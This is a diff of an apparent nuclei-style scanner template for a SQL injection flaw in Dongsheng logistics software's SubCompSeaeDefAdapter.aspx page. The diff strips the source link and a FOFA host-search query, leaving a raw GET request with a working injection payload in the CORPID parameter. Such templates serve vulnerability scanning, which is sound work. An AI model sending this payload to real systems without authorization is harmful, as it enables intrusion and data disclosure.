@@ -3,12 +3,8 @@ info:
   name: 东胜物流软件SubCompSeaeDefAdapterSQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/grneipfngfx6mfvw'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: grneipfngfx6mfvw
-    fofa: body="CompanysAdapter.aspx"
 http:
 - raw:
   - GET /FeeCodes/SubCompSeaeDefAdapter.aspx?CORPID=-122')+and+1=user--+ HTTP/1.1
